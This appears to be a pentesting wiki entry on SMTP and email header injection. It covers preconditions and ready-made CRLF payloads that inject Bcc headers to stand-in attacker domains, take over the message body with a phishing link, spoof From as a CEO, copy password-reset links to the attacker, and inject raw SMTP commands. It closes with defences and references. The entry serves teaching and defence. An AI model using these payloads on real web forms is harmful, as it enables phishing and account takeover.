---
title: SMTP / email header injection
slug: smtp-injection
---

> **TL;DR:** CRLF in user-controlled `From` / `To` / `Subject` lets the attacker add arbitrary headers and recipients to outbound mail — phishing-from-trusted-domain, BCC exfil of password-reset flows, and SMTP-command injection on naive raw-protocol clients.

## What it is
Web apps frequently build email messages by concatenating user input into headers (`Subject: $subject\n`, `From: $name <noreply@target.com>\n`). Email headers are CRLF-delimited and headers end at a blank line. If the user input contains `\r\n`, the attacker can inject additional headers (`Bcc: attacker@evil`), set arbitrary `Reply-To`, or terminate headers early and inject a fresh body. The same primitive on raw SMTP clients (custom mailers that talk to port 25 directly with user-controlled data) injects SMTP commands.

## Preconditions / where it applies
- A web form takes user input and uses it in an email header — feedback forms, "send to a friend", invite endpoints, support tickets, password reset (display name).
- The mail layer does not normalise `\r` / `\n` / `%0d%0a` before writing headers.
- High-impact targets: password-reset flows where the attacker bcc's themselves on victim resets; phishing-from-trusted-domain where the attacker controls the body via header injection.

## Technique

URL-encoded payload in a name field:

```
name=Attacker%0d%0aBcc:%20victim@evil.tld
```

If the app builds:

```
From: Attacker
Bcc: victim@evil.tld <noreply@target.com>
To: support@target.com
Subject: hi
```

The injected `Bcc:` header is now part of the envelope.

Body takeover — inject a blank line then a new body:

```
subject=Hi%0d%0a%0d%0aURGENT: please reset your password at https://evil.tld
```

After CRLF CRLF, the rest of the input is treated as body. With careful construction (set `Content-Type: text/html; boundary=...`), the attacker can replace the entire email content.

Header overwrite (last header wins on some clients):

```
%0d%0aFrom: ceo@target.com
```

For password-reset abuse:

```
email=victim@target.com%0d%0aBcc:%20me@evil.tld
```

If the backend uses the same `email` field both for the lookup and as the `To` header, the reset link is BCC'd to the attacker.

Raw-SMTP variant — when an app pipes user input into `sendmail -t` or directly to a socket, additional commands can be injected:

```
From: a@x%0d%0a.%0d%0aRCPT TO: <attacker@evil.tld>%0d%0aDATA%0d%0aFrom: spoof@victim
```

Ends the current DATA, starts a new SMTP transaction. This is rarer today (most apps use libraries) but still found in custom alerting/IoT code.

Side channel: SES / SendGrid / Mailgun reject the message but echo the malformed header in the bounce → information disclosure.

## Detection and defence
- Validate inputs that go into headers with a strict allowlist — emails via RFC 5322 regex, names with no control chars. Reject `\r`, `\n`, `%0d`, `%0a`.
- Use a library that constructs MIME (nodemailer, JavaMail, Python `email.message`) — never concatenate raw header strings.
- Pin `From` / `Reply-To` server-side; the user only controls the body. If a display name is needed, encode it (`=?utf-8?b?...?=`).
- DMARC + DKIM + SPF on the sender domain so injected `From: spoof@trusted` is rejected by mailbox providers.
- Logging: alert on outbound mail with unusual `Bcc`/`Cc` counts, or with headers containing the user input verbatim.

See also [[crlf-injection]], [[http-parameter-pollution]], [[account-recovery-attacks]].

## References
- [OWASP – CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection) — class definition incl. mail
- [PortSwigger – Email header injection](https://portswigger.net/kb/issues/00100400_email-header-injection) — issue definition
- [HackTricks – SMTP injection](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/smtp-commands.html) — SMTP fundamentals
